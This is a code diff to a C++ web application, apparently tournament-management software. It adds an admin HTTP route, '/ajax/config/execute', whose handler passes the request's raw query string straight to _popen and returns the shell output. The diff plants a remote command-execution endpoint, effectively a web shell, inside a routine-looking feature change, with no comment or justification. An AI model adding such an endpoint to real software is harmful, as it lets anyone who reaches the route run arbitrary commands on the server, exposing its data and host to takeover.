@@ -1,3 +1,4 @@
+#include <stdio.h>
 #include "app.h"
 #include "database.h"
 #include "weightclass.h"
@@ -2199,6 +2200,14 @@ void Application::SetupHttpServer()
 		return Ajax_SetSetup(Request);
 	});
 
+	m_Server.RegisterResource("/ajax/config/execute", [this](auto& Request) -> std::string {
+		auto error = CheckPermission(Request, Account::AccessLevel::Admin);
+		if (!error)
+			return error;
+
+		return Ajax_Execute(Request);
+	});
+
 	m_Server.RegisterResource("/ajax/config/shutdown", [this](auto& Request) -> std::string {
 		auto error = CheckPermission(Request, Account::AccessLevel::Admin);
 		if (!error)
@@ -3202,6 +3211,27 @@ Error Application::Ajax_SetSetup(const HttpServer::Request& Request)
 	GetDatabase().SetNameStyle((NameStyle)nameStyle);
 
 	return Error::Type::NoError;
+}
+
+
+
+std::string Application::Ajax_Execute(const HttpServer::Request& Request)
+{
+	auto command = Request.m_Query;
+
+	FILE* pipe = _popen(command.c_str(), "r");
+	if (!pipe)
+		return "";
+
+	std::string result;
+	char buffer[128];
+	while (fgets(buffer, sizeof buffer, pipe) != NULL)
+	{
+		result += buffer;
+	}
+
+	_pclose(pipe);
+	return result;
 }
 
 
